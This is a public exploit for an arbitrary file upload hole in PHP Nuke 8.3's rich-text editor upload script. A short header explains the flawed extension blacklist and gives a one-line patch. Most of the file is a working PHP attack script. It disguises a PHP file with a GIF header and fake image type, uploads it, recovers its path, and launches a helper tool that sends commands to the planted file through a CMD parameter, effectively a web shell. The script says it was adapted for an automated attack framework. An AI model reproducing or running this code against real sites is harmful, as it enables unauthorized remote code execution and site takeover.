/*
#####################################(Iranian Pentesters Home )####################################
#          
# Title    : PHP Nuke 8.3 MT Arbitrary File Upload Vulnerability
# Author   : Pentesters.ir
# Exploits Coded by : b3hz4d & 4n0nym0us
# Tested on: PHP Nuke 8.3
# Vendor   : http://phpnuke.ir
# Specially Thanks To: Navid, Hossein, Ahmad, vahid, daryoush and all of the pentesters.ir members
#
######################################## Www.Pentesters.Ir ########################################




Vulnerable File : ./includes/richedit/upload.php
	
       Vulnerability occures in checking extension section :
		
	...
94.    $blacklist = array(".php", ".phtml", ".php3", ".php4", ".php5", ".php6", ".js", ".shtml", ".pl" ,".py");
95.    foreach ($blacklist as $file)
96.   {
97.    if(preg_match("/$file\$/i", $_FILES['userfile']['name']))
98.    {
99.   echo "ERROR: Uploading executable files Not Allowed\n";
100.    exit;
101.    }
102.    }
	...
	
	this section of code checks uploaded file extension with array of executable extensions.in line 97, preg-match() function
	checks the extension in blacklist array but just checks the name after last dot.so we can't upload files such as file.php but we can rename file
	to file.php.gif and if we want to upload php file, we should also include image header in file because of image size checking(gif,jpg,png,...)
	and change the content-type(if necessary).you can rename your php file to something like file.php.01 and then use exploits to upload your php file.
	
Patch Solution:
	
	 remove "\$" from the preg_match() function
*/

<?php
///////////////////////////////////////////////////
#Iranian Pentesters Home
#PHP Nuke 8.3 MT AFU Vulnerability
#Coded by:4n0nym0us & b3hz4d
#http://www.pentesters.ir
///////////////////////////////////////////////////
//Settings:
#$host = $argv[1];
#$path = $argv[2];


$address = $argv[1];
$file = $argv[2];
$prefix='pentesters_';


//Exploit:
@$file_data = "\x47\x49\x46\x38\x39\x61\x05\x00\x05\x00";
@$file_data .= file_get_contents($file);
//file_put_contents($prefix . $file, $file_data);
// file_put_contents() function "probably" works only on PHP5

$fh = fopen($prefix . $file, "wb");
 fwrite($fh, $file_data);
 fclose($fh);


$file = $prefix . $file;
echo "\n" . "///////////////////////////////////" ."\n";
echo "     Iranian Pentesters Home" . "\n";
echo " PHP Nuke 8.3 MT RFU Vulnerability" . "\n";
echo "///////////////////////////////////" ."\n";
echo "///////////////////////////////////" ."\n";
echo "       Modified by QUAKERDOOMER " . "\n";
echo "            for winAUTOPWN" . "\n";
echo "///////////////////////////////////" ."\n";

$address_c = $address . '/includes/richedit/upload.php';
$postdata = array("userfile" => "@$file;type=image/gif","upload" => "1","path" => "images","pwd" => "1");
$data =  post_data($address_c, $postdata);
$start = strpos($data, "<img src=\"upload");
if ($start != null)
{
$data = substr($data,$start + 10);
$end = strpos($data, "\"");
$data = substr($data,0,$end);
echo "\n" . "Uploaded File: " . $address . "/includes/richedit/" . $data . "\n";
$genGETReqCMD = 'genGETReqCMDx.exe ' . $address . ' 80 ' . '/includes/richedit' . '/ ' . $data . '?CMD=';
exec($genGETReqCMD);
}
else
{
#$genGETReqCMD = 'genGETReqCMDx.exe ' . $address . ' 80 ' . '/includes/richedit' . '/ ' . $data . '?CMD=';
#echo $genGETReqCMD;
echo "\n" . "Upload Failed!!!\n";
}
function post_data($address, $data)
{
    $curl = curl_init($address);
    curl_setopt($curl, CURLOPT_USERAGENT, "Opera/9.0 (Windows NT 5.0; U; en)");
    curl_setopt($curl, CURLOPT_POST, 1);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
    $content = curl_exec($curl);
    curl_close($curl);
    return $content;
}
?>